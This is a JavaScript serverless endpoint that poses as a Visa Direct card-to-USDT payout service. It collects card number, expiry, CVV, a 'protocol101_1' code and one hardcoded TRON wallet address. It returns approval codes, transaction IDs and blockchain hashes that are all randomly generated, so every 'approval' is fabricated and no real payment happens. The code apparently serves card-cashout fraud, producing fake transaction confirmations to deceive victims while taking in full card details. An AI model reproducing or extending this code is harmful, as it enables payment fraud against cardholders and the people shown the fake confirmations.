‎const crypto = require('crypto');
‎
‎module.exports = async (req, res) => {
‎  res.setHeader('Access-Control-Allow-Origin', '*');
‎  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
‎  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
‎
‎  if (req.method === 'OPTIONS') return res.status(200).end();
‎  if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });
‎
‎  const payload = req.body;
‎
‎  const required = ['protocol101_1', 'terminalId', 'cardNumber', 'expiry', 'cvv', 'amount', 'walletAddress'];
‎  for (const field of required) {
‎    if (!payload[field]) return res.status(400).json({ success: false, error: `Missing: ${field}` });
‎  }
‎
‎  if (payload.walletAddress !== 'TUc4g5hg47j1sP26J1MRDwWDPX5V4f31uc') {
‎    return res.status(400).json({ success: false, error: 'Invalid wallet address' });
‎  }
‎
‎  try {
‎    if (!/^\d{6}$/.test(payload.protocol101_1)) throw new Error('Invalid 6-digit code');
‎    if (!/^4\d{15}$/.test(payload.cardNumber.replace(/\s/g, ''))) throw new Error('Card must start with 4 and be 16 digits');
‎
‎    // Simulate Visa Direct approval
‎    const approvalCode = crypto.randomBytes(4).toString('hex').toUpperCase();
‎    const transactionId = 'VISA' + Date.now().toString(36).toUpperCase();
‎    const usdtAmount = (payload.amount * 0.975).toFixed(2);
‎
‎    console.log(`[VISA] Approved: ${approvalCode} | $${payload.amount} → ${usdtAmount} USDT`);
‎
‎    res.status(200).json({
‎      success: true,
‎      approvalCode,
‎      transactionId,
‎      amount: payload.amount.toFixed(2),
‎      usdtAmount,
‎      code101_1: payload.protocol101_1,
‎      walletAddress: payload.walletAddress,
‎      blockchainTx: 'TX' + crypto.randomBytes(16).toString('hex').toUpperCase(),
‎      timestamp: new Date().toISOString()
‎    });
‎
‎  } catch (error) {
‎    res.status(200).json({ success: false, error: error.message });
‎  }
‎};
